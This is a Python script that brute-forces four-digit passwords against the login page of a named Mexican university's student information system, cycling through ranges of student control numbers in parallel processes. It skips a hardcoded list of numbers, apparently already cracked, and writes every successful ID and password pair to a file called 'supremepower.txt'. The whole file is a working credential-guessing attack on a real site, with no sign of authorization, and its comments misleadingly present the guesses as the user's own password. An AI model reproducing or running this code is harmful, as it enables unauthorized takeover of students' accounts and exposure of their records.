import multiprocessing
import requests

# Define the URL of the login page
login_url = "https://sii.itq.edu.mx/sistema/index.php"
control_numbers_array = [
    20140801,
    20140892,
    20140901,
    20140902,
    20140903,
    20140904,
    20140905,
    20140935,
    20140918,
    20140913,
    20140922,
    20140921,
    20140992,
    20140939,
    20140989,
    20140919,
    20140950,
    20140974,
    20140928,
    20140908,
    20140907,
    20140929,
    20140964,
    20140997,
    20140916,
    20140970,
    20140975,
    20140967,
    20140977,
    20140985,
    20140938,
    20140942,
    20140969,
    20140965,
    20140927,
    20140944,
    20140911,
    20141003,
    20140926,
    20140931,
    20140999,
    20140933,
    20140941,
    20140945,
    20140983,
    20140973,
    20140960,
    20141004,
    20140995,
    20140996,
    20140987,
    20140935
]

def generate_numbers(start, end, ctrl_number, success_event):
    for number in range(start, end + 1):
        formatted_number = f'{number:04}'
        session = requests.Session()
        #print(formatted_number)
        data = {
            "no_de_control": ctrl_number,  # Replace with your actual control number
            "password": formatted_number,  # Replace with your actual password
        }

        response = session.post(login_url, data=data)
        if "modulos/alu/" in response.text:
            print("Login successful!")
            print(f"{ctrl_number}:{formatted_number}")
            with open("supremepower.txt", "a") as f:
                f.write(f"{ctrl_number}:{formatted_number}\n")
            success_event.set()
            break
        session.close()

if __name__ == "__main__":
    control_numbers = list(range(20140930, 20140940))  # 100 control numbers
    success_events = [multiprocessing.Event() for _ in range(len(control_numbers))]
    #success_events = [multiprocessing.Event() for ctrl_number in control_numbers_array]
    processes = []
    for ctrl_number, success_event in zip(control_numbers, success_events):
        ranges = [(2000, 4499), (6600, 9999)]
        
        if ctrl_number in control_numbers_array:
            print("control number skipped: ", ctrl_number)
            continue  # Skip this control number
        for start, end in ranges:
            print(f"Starting process for range {start} to {end} for {ctrl_number}")
            process = multiprocessing.Process(target=generate_numbers, args=(start, end, ctrl_number, success_event))
            processes.append(process)
            process.start()

    # Wait for any process to set its respective success event
    for success_event in success_events:
        success_event.wait()

    # Terminate all other processes
    for process in processes:
        if process.is_alive():
            process.terminate()

    # Join the terminated processes (optional)
    for process in processes:
        process.join()
